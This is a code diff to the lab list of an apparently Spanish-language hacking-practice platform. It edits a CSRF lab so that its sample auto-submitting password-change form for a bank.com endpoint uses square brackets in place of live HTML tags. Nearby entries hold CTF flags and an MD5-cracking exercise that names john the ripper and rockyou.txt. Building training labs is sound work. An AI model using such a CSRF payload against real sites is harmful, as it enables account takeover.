@@ -68,7 +68,7 @@ const LABS = [
     {id:"L008",title:"CSRF Attack",desc:"Realiza un ataque Cross-Site Request Forgery",diff:"intermedio",cat:"web",xp:150,
      hints:["Crea HTML con form automático","Token CSRF predecible","Método POST vulnerable"],
      challenge:"Crea un HTML que cambie la contraseña del usuario automáticamente.",flag:"flag{csrf_4tt4ck}",
-     terminal:{prompt:"attacker@csrf:~$",commands:["<form method='POST' action='http://bank.com/change-pass'>","<input name='new_pass' value='hacked123'>","</form><script>document.forms[0].submit()</script>","Contraseña cambiada a: hacked123","flag{csrf_4tt4ck}"]}},
+     terminal:{prompt:"attacker@csrf:~$",commands:["[form method=POST action=http://bank.com/change-pass]","[input name=new_pass value=hacked123]","[/form] [script]document.forms[0].submit()[/script]","Contraseña cambiada a: hacked123","flag{csrf_4tt4ck}"]}},
     {id:"L009",title:"Password Cracking",desc:"Crackea hashes de contraseñas",diff:"principiante",cat:"crypto",xp:100,
      hints:["john the ripper","rockyou.txt","Identifica hash type"],
      challenge:"Crackea el hash MD5: 5f4dcc3b5aa765d61d8327deb882cf99",flag:"flag{p4ssw0rd_cr4ck}",
